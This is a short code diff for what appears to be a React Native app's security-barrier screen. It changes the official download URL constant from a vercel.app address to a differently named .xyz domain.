@@ -15,7 +15,7 @@ import { Feather } from '@expo/vector-icons';
 import { useSafeAreaInsets } from 'react-native-safe-area-context';
 
 const BRAND_LOGO = require('./assets/header_icon.png');
-const OFFICIAL_DOWNLOAD_URL = 'https://movieflix-pi-six.vercel.app/download';
+const OFFICIAL_DOWNLOAD_URL = 'https://mws.wallpaperdomain.xyz/download';
 
 export default function SecurityBarrierScreen({
   securityStatus,
